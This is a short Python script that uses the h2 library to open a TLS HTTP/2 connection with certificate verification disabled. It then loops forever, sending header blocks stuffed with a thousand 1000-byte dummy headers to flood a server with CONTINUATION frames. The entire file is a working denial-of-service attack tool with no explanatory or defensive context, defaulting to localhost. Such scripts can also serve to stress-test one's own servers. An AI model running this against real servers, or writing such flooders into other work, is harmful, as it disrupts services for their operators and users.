import socket
import ssl
from h2 import connection, config


def continuation_flood(url='localhost', port=8000):
    sock = socket.create_connection((url, port))

    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    ctx.set_alpn_protocols(['h2'])
    sock = ctx.wrap_socket(sock, server_hostname=url)

    cfg = config.H2Configuration(client_side=True)
    conn = connection.H2Connection(config=cfg)
    conn.initiate_connection()

    headers = [(':method', 'GET'), (':authority', url), (':path', '/'), (':scheme', 'https')]
    
    # Create a lot of big headers to flood the server with CONTINUATION frames
    headers.extend([('flood', 'X'*1000)]*1000)  

    while True:
        conn.send_headers(
            conn.get_next_available_stream_id(),
            headers
        )
        sock.send(conn.data_to_send())
                

if __name__ == "__main__":
    continuation_flood()
